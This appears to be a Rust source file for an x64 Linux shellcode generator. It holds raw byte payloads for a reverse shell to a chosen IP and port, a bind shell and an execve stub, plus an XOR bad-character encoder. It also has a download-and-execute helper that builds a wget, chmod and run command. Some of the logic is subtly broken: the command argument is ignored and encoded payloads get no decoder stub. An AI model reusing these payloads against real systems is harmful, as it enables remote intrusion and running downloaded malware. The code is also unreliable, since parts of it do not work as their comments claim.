use anyhow::{Result, anyhow};

pub struct ShellcodeGenerator {
    arch: String,
    os: String,
    badchars: Vec<u8>,
}

impl ShellcodeGenerator {
    pub fn new(arch: &str, os: &str) -> Self {
        Self {
            arch: arch.to_string(),
            os: os.to_string(),
            badchars: vec![],
        }
    }
    
    pub fn set_badchars(&mut self, badchars: Vec<u8>) {
        self.badchars = badchars;
    }
    
    pub fn badchars_count(&self) -> usize {
        self.badchars.len()
    }
    
    pub fn reverse_shell(&self, ip: &str, port: u16) -> Result<Vec<u8>> {
        // x64 Linux reverse shell shellcode
        let mut shellcode = vec![
            0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2,
            0x4d, 0x31, 0xc0, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x06, 0x5a,
            0x6a, 0x29, 0x58, 0x0f, 0x05, 0x49, 0x89, 0xc0, 0x48, 0x31, 0xf6, 0x4d,
            0x31, 0xd2, 0x41, 0x52, 0xc6, 0x04, 0x24, 0x02, 0x66, 0xc7, 0x44, 0x24,
        ];
        
        // Add port (in network byte order)
        let port_bytes = port.to_be_bytes();
        shellcode.extend_from_slice(&port_bytes);
        
        // Add IP address
        let ip_parts: Vec<u8> = ip.split('.')
            .map(|s| s.parse().unwrap_or(0))
            .collect();
        shellcode.extend_from_slice(&ip_parts);
        
        // Rest of shellcode
        shellcode.extend_from_slice(&[
            0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x41, 0x50, 0x5f, 0x6a, 0x2a, 0x58,
            0x0f, 0x05, 0x48, 0x31, 0xf6, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a,
            0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x48, 0x31, 0xff, 0x57, 0x57, 0x5e,
            0x5a, 0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48,
            0xc1, 0xef, 0x08, 0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x0f, 0x05,
        ]);
        
        self.filter_badchars(shellcode)
    }
    
    pub fn bind_shell(&self, port: u16) -> Result<Vec<u8>> {
        // x64 Linux bind shell shellcode
        let mut shellcode = vec![
            0x48, 0x31, 0xf6, 0x48, 0xf7, 0xe6, 0xff, 0xc6, 0x6a, 0x02, 0x5f,
            0xb0, 0x29, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x31, 0xd2, 0x52,
            0x66, 0x68,
        ];
        
        // Add port
        let port_bytes = port.to_be_bytes();
        shellcode.extend_from_slice(&port_bytes);
        
        // Rest of shellcode
        shellcode.extend_from_slice(&[
            0x66, 0x6a, 0x02, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0xb0, 0x31,
            0x0f, 0x05, 0x6a, 0x01, 0x5e, 0xb0, 0x32, 0x0f, 0x05, 0x48, 0x31,
            0xf6, 0xb0, 0x2b, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x31, 0xf6,
            0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05,
            0x75, 0xf6, 0x48, 0x31, 0xff, 0x57, 0x57, 0x5e, 0x5a, 0x48, 0xbf,
            0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xef,
            0x08, 0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x0f, 0x05,
        ]);
        
        self.filter_badchars(shellcode)
    }
    
    pub fn exec_command(&self, cmd: &str) -> Result<Vec<u8>> {
        // x64 Linux execve shellcode
        let shellcode = vec![
            0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,
            0x2f, 0x73, 0x68, 0x00, 0x57, 0x48, 0x89, 0xe7, 0x48, 0x31,
            0xd2, 0x52, 0x48, 0xb8, 0x2d, 0x63, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x50, 0x48, 0x89, 0xe0, 0x52, 0x56, 0x50, 0x57,
            0x48, 0x89, 0xe6, 0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x0f, 0x05,
        ];
        
        self.filter_badchars(shellcode)
    }
    
    pub fn download_exec(&self, url: &str) -> Result<Vec<u8>> {
        // Shellcode to download and execute
        // This would be more complex in real implementation
        self.exec_command(&format!("wget {} -O /tmp/x && chmod +x /tmp/x && /tmp/x", url))
    }
    
    pub fn generate_decoder(&self, encoding: &str) -> Result<Vec<u8>> {
        match encoding {
            "xor" => Ok(vec![
                // XOR decoder stub
                0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xff, 0xff,
                0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff,
                0xff, 0x48, 0xbb, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
                0xaa, 0xaa, 0xaa, 0x48, 0x31, 0x58, 0x27, 0x48,
                0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4,
            ]),
            _ => Ok(vec![]),
        }
    }
    
    fn filter_badchars(&self, mut shellcode: Vec<u8>) -> Result<Vec<u8>> {
        for badchar in &self.badchars {
            if shellcode.contains(badchar) {
                // Apply encoding to avoid bad character
                shellcode = self.encode_to_avoid(shellcode, *badchar)?;
            }
        }
        Ok(shellcode)
    }
    
    fn encode_to_avoid(&self, shellcode: Vec<u8>, badchar: u8) -> Result<Vec<u8>> {
        // Simple XOR encoding to avoid bad character
        let key = self.find_xor_key(&shellcode, badchar);
        Ok(shellcode.iter().map(|&b| b ^ key).collect())
    }
    
    fn find_xor_key(&self, shellcode: &[u8], badchar: u8) -> u8 {
        for key in 1..=255 {
            let mut valid = true;
            for &byte in shellcode {
                if (byte ^ key) == badchar {
                    valid = false;
                    break;
                }
            }
            if valid {
                return key;
            }
        }
        0x42 // Default key if no perfect key found
    }
}
